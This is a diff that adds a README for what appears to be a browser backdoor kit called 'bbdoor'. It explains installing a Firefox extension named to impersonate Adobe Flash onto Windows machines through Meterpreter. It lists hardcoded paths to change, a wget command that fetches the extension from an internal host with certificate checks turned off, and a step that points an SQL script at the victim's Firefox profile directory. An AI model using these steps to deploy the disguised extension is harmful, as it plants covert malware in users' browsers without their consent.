@@ -1,0 +1,15 @@
+This script is written to install the scripts into windows firefox only.
+Meterpreter has to be run from linux. 
+
+A lot of stuff is hardcoded into the script, needs a cleanup.
+
+At least change these lines in install_extension_firefox_windows.rc:
+if (paths =~ /bbdoor/)
+bbdoor_path = "/root/bbdoor"
+
+At least change these lines in sqlite.sh:
+DIR=/root/bbdoor														# where are the files
+XPI=flashX@adobe.com.xpi												# filename of the extension
+wget --no-check-certificate -O $DIR/$XPI https://192.168.2.100/$XPI     # this is where the newest xpi can be found
+
+Also modify the sqlite.sql CHANGE_TO_FIREFOX_PROFILE_DIRECTORY variable to the user profile directory.
